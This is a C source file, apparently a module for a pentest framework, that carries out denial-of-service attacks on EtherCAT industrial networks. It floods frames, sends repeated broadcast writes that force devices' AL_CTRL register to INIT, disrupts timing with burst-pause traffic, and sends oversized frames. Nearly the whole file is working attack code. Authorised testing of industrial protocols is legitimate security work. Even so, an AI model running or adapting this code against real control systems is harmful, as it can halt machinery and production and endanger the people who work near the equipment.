
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include "kraken_module_abi.h"
#include "kraken_module_abi_v2.h"

#define ECAT_TYPE 1

#define KRAKEN_SIG "KRKN"
#define KRAKEN_SIG_LEN 4

static size_t build_frame(uint8_t *buf, uint8_t cmd, uint16_t addr, uint16_t offset,
                          const uint8_t *data, uint16_t data_len, uint16_t wkc) {
    uint16_t total_data_len = data_len + KRAKEN_SIG_LEN;
    uint16_t frame_len = 10 + total_data_len + 2;
    uint16_t header = (frame_len & 0x7FF) | (ECAT_TYPE << 12);
    buf[0] = header & 0xFF;
    buf[1] = (header >> 8) & 0xFF;
    buf[2] = cmd;
    buf[3] = 0x01;
    buf[4] = addr & 0xFF;
    buf[5] = (addr >> 8);
    buf[6] = offset & 0xFF;
    buf[7] = (offset >> 8);
    uint16_t len_flags = total_data_len & 0x7FF;
    buf[8] = len_flags & 0xFF;
    buf[9] = (len_flags >> 8) & 0xFF;
    buf[10] = 0;
    buf[11] = 0;
   
    memcpy(buf + 12, KRAKEN_SIG, KRAKEN_SIG_LEN);
    if (data && data_len > 0) {
        memcpy(buf + 12 + KRAKEN_SIG_LEN, data, data_len);
    } else if (data_len > 0) {
        memset(buf + 12 + KRAKEN_SIG_LEN, 0, data_len);
    }
    buf[12 + total_data_len] = wkc & 0xFF;
    buf[12 + total_data_len + 1] = (wkc >> 8) & 0xFF;
    return 2 + frame_len;
}

static int test_flood(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                      KrakenRunResultV2 *result, int duration_ms) {
    uint8_t frame[64];
    uint8_t data[2] = {0};
    size_t len = build_frame(frame, 7, 0, 0, data, 2, 0);

    int sent = 0;
    clock_t start = clock();
    clock_t end = start + (duration_ms * CLOCKS_PER_SEC / 1000);

    while (clock() < end) {
        if (ops->send(conn, frame, len, 1) > 0) sent++;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "  Flood: sent %d frames in %dms (%.0f fps)",
             sent, duration_ms, sent * 1000.0 / duration_ms);
    add_log_v2(result, buf);

    return sent;
}

static int test_state_change(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                             KrakenRunResultV2 *result) {
    uint8_t frame[64];
   
    uint8_t data[2] = {0x01, 0x00};
    size_t len = build_frame(frame, 8, 0, 0x0120, data, 2, 0);

    int sent = 0;
    for (int i = 0; i < 50; i++) {
        if (ops->send(conn, frame, len, 10) > 0) sent++;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "  State attack: sent %d BWR(AL_CTRL=INIT) frames", sent);
    add_log_v2(result, buf);

    return sent;
}

static int test_timing_disruption(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                                  KrakenRunResultV2 *result) {
    uint8_t frame[64];
    uint8_t data[2] = {0};
    size_t len = build_frame(frame, 7, 0, 0, data, 2, 0);

    int sent = 0;
   
    for (int burst = 0; burst < 10; burst++) {
       
        for (int i = 0; i < 20; i++) {
            if (ops->send(conn, frame, len, 1) > 0) sent++;
        }
       
        clock_t pause_end = clock() + (5 * CLOCKS_PER_SEC / 1000);
        while (clock() < pause_end) {}
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "  Timing disruption: sent %d frames in burst-pause pattern", sent);
    add_log_v2(result, buf);

    return sent;
}

static int test_large_frames(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                             KrakenRunResultV2 *result) {
    uint8_t frame[1500];
    uint8_t data[1400];
    memset(data, 0xAA, sizeof(data));

    size_t len = build_frame(frame, 7, 0, 0, data, sizeof(data), 0);

    int sent = 0;
    for (int i = 0; i < 20; i++) {
        if (ops->send(conn, frame, len, 50) > 0) sent++;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "  Large frames: sent %d frames of %zu bytes", sent, len);
    add_log_v2(result, buf);

    return sent;
}

KRAKEN_API int kraken_run_v2(
    KrakenConnectionHandle conn,
    const KrakenConnectionOps *ops,
    const KrakenTarget *target,
    uint32_t timeout_ms,
    const char *params_json,
    KrakenRunResultV2 **out_result
) {
    (void)timeout_ms;
    (void)params_json;

    KrakenRunResultV2 *result = calloc(1, sizeof(KrakenRunResultV2));
    if (!result) return -1;
    copy_target(&result->target, target);

    add_log_v2(result, "Starting EtherCAT DoS tests");

    int total_sent = 0;

    add_log_v2(result, "Test 1: Frame flood (500ms)");
    total_sent += test_flood(conn, ops, result, 500);

    add_log_v2(result, "Test 2: State change attack");
    total_sent += test_state_change(conn, ops, result);

    add_log_v2(result, "Test 3: Timing disruption");
    total_sent += test_timing_disruption(conn, ops, result);

    add_log_v2(result, "Test 4: Large frame attack");
    total_sent += test_large_frames(conn, ops, result);

    char summary[128];
    snprintf(summary, sizeof(summary), "Total frames sent: %d", total_sent);
    add_log_v2(result, summary);

    KrakenFindingV2 finding = {0};
    finding.id = mystrdup("ecat-dos");
    finding.module_id = mystrdup("ecat_dos");
    finding.success = (total_sent > 0);
    finding.title = mystrdup("EtherCAT DoS Testing");
    finding.severity = mystrdup("medium");

    snprintf(summary, sizeof(summary),
             "DoS tests completed. Sent %d frames including floods, state changes, and timing attacks.",
             total_sent);
    finding.description = mystrdup(summary);
    finding.timestamp = (int64_t)time(NULL);
    copy_target(&finding.target, target);

    add_finding_v2(result, &finding);

    *out_result = result;
    return 0;
}

KRAKEN_API void kraken_free_v2(void *p) {
    if (!p) return;
    KrakenRunResultV2 *r = (KrakenRunResultV2 *)p;
    for (size_t i = 0; i < r->logs.count; i++)
        free((void *)r->logs.strings[i]);
    free((void *)r->logs.strings);
    for (size_t i = 0; i < r->findings_count; i++) {
        KrakenFindingV2 *f = &r->findings[i];
        free((void *)f->id);
        free((void *)f->module_id);
        free((void *)f->title);
        free((void *)f->severity);
        free((void *)f->description);
        free_target(&f->target);
    }
    free(r->findings);
    free_target(&r->target);
    free(r);
}
